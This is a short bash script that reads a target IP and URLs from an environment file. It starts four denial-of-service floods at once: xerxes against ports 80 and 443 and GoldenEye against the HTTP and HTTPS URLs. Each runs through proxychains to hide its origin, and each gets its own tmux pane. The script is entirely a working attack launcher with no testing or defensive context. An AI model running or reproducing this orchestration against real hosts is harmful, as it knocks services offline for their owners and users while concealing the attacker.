#!/bin/bash

# Initialize the commands array
cmds_arr=()
[ -r /etc/profile.d/target.env ] && . /etc/profile.d/target.env
cmds_arr+=("proxychains4 -q /usr/local/bin/xerxes $TARGET_IP 80")
cmds_arr+=("proxychains4 -q /usr/local/bin/xerxes $TARGET_IP 443")
cmds_arr+=("proxychains4 -q python3 /usr/local/bin/goldeneye.py $TARGET_URL_HTTP -m random -s 25")
cmds_arr+=("proxychains4 -q python3 /usr/local/bin/goldeneye.py $TARGET_URL_HTTPS -m random -s 25")

if [ -n "$TMUX" ]; then
  # Split the window into two vertical panes
  tmux split-window -h

  # Split the top-left pane into two horizontal panes
  tmux split-window -v

  # Move to the top-right pane and split it into two horizontal panes
  tmux select-pane -R
  tmux split-window -v

  # Execute commands in each pane
  for i in {0..3}; do
    command="${cmds_arr[$i]}"
    
    # Send command to the appropriate pane
    tmux send-keys -t "0.$i" "$command" C-m
  done
fi
